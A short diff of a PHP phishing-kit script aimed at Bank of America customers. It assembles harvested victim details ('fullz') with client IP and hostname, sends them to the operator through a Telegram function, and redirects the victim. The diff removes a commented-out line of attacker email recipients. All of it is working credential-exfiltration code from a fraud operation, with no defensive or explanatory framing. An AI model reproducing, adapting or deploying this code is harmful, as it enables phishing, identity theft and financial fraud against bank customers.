@@ -23,7 +23,6 @@ $message .= "Client IP : ".$ip."\n";
 $message .= "HostName : ".$hostname."\n";
 $rnessage = "$message\n";
 $message .= "------Bank---Of--America-Foooolz------\n";
-// $recipient = "coyjerry910@gmail.com,coyjerry910@yahoo.com,coyjerry910@aol.com";
 $subject = "Bank Of America Edd-fullz\r\n\r\n".$message;
 send_telegram_msg($message);
 header("Location: ========-.htm");
